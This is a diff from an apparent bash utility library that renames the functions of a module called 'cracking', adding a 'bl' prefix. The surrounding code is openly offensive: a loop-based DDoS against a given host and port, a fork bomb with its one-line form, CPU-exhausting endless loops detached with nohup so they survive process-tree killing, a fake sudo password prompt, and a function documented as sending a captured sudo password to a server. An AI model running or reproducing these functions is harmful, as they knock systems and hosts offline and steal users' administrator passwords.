@@ -9,12 +9,12 @@
 # This library written by Torben Sickert stand under a creative commons naming
 # 3.0 unported license. see http://creativecommons.org/licenses/by/3.0/deed.de
 # endregion
-cracking_make_simple_ddos_attack() {
+bl_cracking_make_simple_ddos_attack() {
     local __doc__='
     Makes a ddos attack to given host on given port. First argument: Number
     of requests. Second argument: Port
 
-    >>> cracking.make_simple_ddos_attack 100 80
+    >>> bl.cracking.make_simple_ddos_attack 100 80
     '
     local index
     for (( index=0; index<"$1"; index++ )); do
@@ -22,71 +22,71 @@ cracking_make_simple_ddos_attack() {
     done
     return $?
 }
-alias cracking.make_simple_ddos_attach='cracking_make_simple_ddos_attack'
-cracking_stress_system() {
+alias bl.cracking.make_simple_ddos_attach='bl_cracking_make_simple_ddos_attack'
+bl_cracking_stress_system() {
     local __doc__='
     Stress system with given number of endless loops.
 
-    >>> cracking.stress_system 10
+    >>> bl.cracking.stress_system 10
     '
     local index
     for (( index=0; index<"$1"; index++ )); do
-        cracking.endless_loop &
+        bl.cracking.endless_loop &
     done
     return $?
 }
-alias cracking.stress_system='cracking_stress_system'
-cracking_endless_loop() {
+alias bl.cracking.stress_system='bl_cracking_stress_system'
+bl_cracking_endless_loop() {
     local __doc__='
     Starts an endless loop.
 
-    >>> cracking.endless_loop
+    >>> bl.cracking.endless_loop
     '
     while true; do
         :
     done
     return $?
 }
-alias cracking.endless_loop='cracking_endless_loop'
-cracking_fork_bomb() {
+alias bl.cracking.endless_loop='bl_cracking_endless_loop'
+bl_cracking_fork_bomb() {
     local __doc__='
     Implementation for fork bomb. Note short version: :() { : | : & }; :
 
-    >>> cracking.fork_bomb
+    >>> bl.cracking.fork_bomb
     '
-    cracking.fork_bomb | cracking.fork_bomb &
+    bl.cracking.fork_bomb | bl.cracking.fork_bomb &
     return $?
 }
-alias cracking.fork_bomb='cracking_fork_bomb'
-cracking_stress_system_with_fork_bomb() {
+alias bl.cracking.fork_bomb='bl_cracking_fork_bomb'
+bl_cracking_stress_system_with_fork_bomb() {
     local __doc__='
     Runs a forkbomb in an endless loop. This is useful if operating system
     kills the whole process tree.
 
-    >>> cracking.stress_system_with_fork_bomb
+    >>> bl.cracking.stress_system_with_fork_bomb
     '
     while true; do
-        cracking.fork_bomb
+        bl.cracking.fork_bomb
     done
     return $?
 }
-alias cracking.stress_system_with_fork_bomb='cracking_stress_system_with_fork_bomb'
-cracking_make_system_unattainable() {
+alias bl.cracking.stress_system_with_fork_bomb='bl_cracking_stress_system_with_fork_bomb'
+bl_cracking_make_system_unattainable() {
     local __doc__='
     Uses a stress system algorithm in its own process to avoid solving the
     problem by process tree killing.
 
-    >>> cracking.make_system_unattainable
+    >>> bl.cracking.make_system_unattainable
     '
-    nohup bash --login -c cracking.stress_system &>/dev/null &
+    nohup bash --login -c bl.cracking.stress_system &>/dev/null &
     return $?
 }
-alias cracking.make_system_unattainable='cracking_make_system_unattainable'
-cracking_fake_sudo_password_attempt() {
+alias bl.cracking.make_system_unattainable='bl_cracking_make_system_unattainable'
+bl_cracking_fake_sudo_password_attempt() {
     local __doc__='
     Shows a fake sudo password attempt.
 
-    >>> cracking.fake_sudo_password_attempt
+    >>> bl.cracking.fake_sudo_password_attempt
     '
     local number password
     for number in 1 2 3; do
@@ -97,8 +97,8 @@ cracking_fake_sudo_password_attempt() {
     echo "sudo: $number incorrect password attempts"
     return $?
 }
-alias cracking.fake_sudo_password_attempt='cracking_fake_sudo_password_attempt'
-cracking_grab_sudo_password() {
+alias bl.cracking.fake_sudo_password_attempt='bl_cracking_fake_sudo_password_attempt'
+bl_cracking_grab_sudo_password() {
     local __doc__='
     Shows a fake sudo password attempt and send to password to server.
 
@@ -126,7 +126,7 @@ cracking_grab_sudo_password() {
         fi
     done
 }
-alias cracking.grab_sudo_password='cracking_grab_sudo_password'
+alias bl.cracking.grab_sudo_password='bl_cracking_grab_sudo_password'
 # region vim modline
 # vim: set tabstop=4 shiftwidth=4 expandtab:
 # vim: foldmethod=marker foldmarker=region,endregion:
